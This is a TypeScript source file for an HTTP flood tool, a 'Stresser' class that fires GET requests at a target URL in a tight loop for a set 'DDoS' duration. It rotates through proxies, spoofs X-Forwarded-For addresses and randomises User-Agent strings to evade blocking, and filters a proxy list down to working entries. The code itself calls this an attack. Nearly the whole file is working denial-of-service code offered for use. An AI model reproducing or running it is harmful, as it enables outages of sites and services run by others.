import { URL } from 'url';

import 'overpaint.js';
import axios, { AxiosRequestConfig } from 'axios';
import { faker } from '@faker-js/faker';

import { setStatic, toHumanTime } from '../utils/Utils';
import { PacketType } from '../enums/PacketType';
import { StresserOptions } from '../types/Options';
import { KProxy } from '../types/Proxy';
import { Stats } from './Stats';
import { Packet } from '../types/Packet';
import { DDoSDuration } from "../types/DDoS";
import { Log } from '../types/Log';
import { LogType } from '../enums/LogType';

export class Stresser {

   private targetURL: URL;
   // ===== Agents =====
   // private _agentIndex: number = 0;
   // get nextAgent() {
   //    return this.options.agents[++this._agentIndex % this.options.agents.length];
   // }
   // ===== Proxies =====
   private _proxyIndex: number = 0;
   private get nextProxy(): KProxy {
      return this.options.proxies[++this._proxyIndex % this.options.proxies.length];
   }
   // ===== Statistics =====
   private stats = new Stats();
   // ===== Options =====
   private options: StresserOptions;
   // ===== Constructor =====
   constructor(options: StresserOptions) {
      // set options
      this.options = options;
      // set target URL
      this.targetURL = new URL(this.options.target);
      // send data updates
      this.sendDataUpdate(this.options.updatesPerSecond || 2);
   }

   // ========== Stressing ==========================================================================

   /**
    * Send a request to the target URL
    * @param config The configuration to use for the request
    * @param proxy The proxy to use for the request
    */
   private async sendRequest(
      config: Partial<AxiosRequestConfig> = {},
      proxy: KProxy = this.nextProxy
   ) {
      try {
         if (this.stats.pending >= this.options.threads) return false;

         this.requestSent();

         var options = {
            headers: {
               'X-Forwarded-For': faker.internet.ipv4(),
               'User-Agent': faker.internet.userAgent(),
               'Accept': '*/*',
               'Accept-Language': 'en-US,en;q=0.5',
               'Accept-Encoding': 'gzip, deflate, br',
               'Referer': this.targetURL.hostname
            },
            proxy: this.options.useProxies ? {
               protocol: 'http',
               host: proxy[0],
               port: Number(proxy[1]),
               auth: proxy.length === 4 ? {
                  username: proxy[2],
                  password: proxy[3]
               } : undefined,
            } : undefined,
            httpAgent: this.options.httpAgent,
            ...config
         };

         const response = await axios.get(this.targetURL.href, options)
         return this.requestComplete(response.status === 200);
      } catch {
         return this.requestComplete(false);
      }
   }

   /**
    * Stress the target URL for a specified duration
    * @param duration The duration of the attack
    * @param config The configuration to use for the requests
    */
   public stress(duration: DDoSDuration, config: any = {}) {
      let loop = setInterval(() => this.sendRequest(config));
      setTimeout(() => {
         clearInterval(loop);
         process.send?.(Packet(PacketType.Done, undefined));
      }, duration * 1000);
   }

   // ========== Proxies =============================================================================

   public async validateProxies(proxies: KProxy[], timeout: number = 5000): Promise<KProxy[]> {
      // validate proxies, and get an array of results (true/false)
      let proxy_results: boolean[] = await Promise.all(
         proxies.map(async (proxy) => await this.sendRequest({ timeout }, proxy))
      );
      // filter out invalid proxies
      let valid_proxies = proxies.filter((proxy, index) => proxy_results[index]);
      // save valid proxies to file
      let txt_data = valid_proxies.map(proxy => proxy.join(':')).join('\n');
      setStatic('valid_proxies.txt', txt_data);

      return valid_proxies;
   }

   // ========== Statistics =========================================================================

   private requestSent() {
      this.stats.requests++;
      this.stats.pending++;
   }

   private requestComplete(success: boolean) {
      if (typeof success !== "boolean") throw new Error('Parameter "success" must be true or false.');
      this.stats.pending--;
      (success) ? this.stats.success++ : this.stats.errors++;
      return success;
   }

   private sendDataUpdate(tps: number = 10) {
      setInterval(() => {
         process.send?.(Packet(PacketType.Data, this.stats));
      }, 1000 / tps);
   }

}

['unhandledRejection', 'uncaughtException']
   .forEach((e: any) =>
      process.on(e, (error: any) => {
         console.error(`${e}: ${error.message}`);
         process.exit(1);
      })
   )
